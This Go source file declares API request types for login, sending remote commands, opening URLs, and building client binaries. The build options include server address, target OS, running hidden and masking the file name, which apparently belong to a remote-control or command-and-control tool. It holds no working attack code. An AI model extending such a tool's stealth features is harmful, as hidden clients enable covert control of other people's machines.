package request

type LoginAPIRequest struct {
	Username string `json:"username" binding:"required"`
	Password string `json:"password" binding:"required"`
}

type SendCommandAPIRequest struct {
	Command   string `json:"command" binding:"required"`
	Parameter string `json:"parameter"`
}

type OpenUrlAPIRequest struct {
	URL string `json:"url" binding:"required"`
}

type BuildClientAPIRequest struct {
	ServerAddress string `json:"server_address"`
	ServerPort    string `json:"server_port"`
	OSTarget      string `json:"os_target" binding:"required"`
	OSArch        string `json:"os_arch"`
	Filename      string `json:"filename"`
	RunHidden     bool   `json:"run_hidden"`
	MaskName      bool   `json:"mask_name"`
}
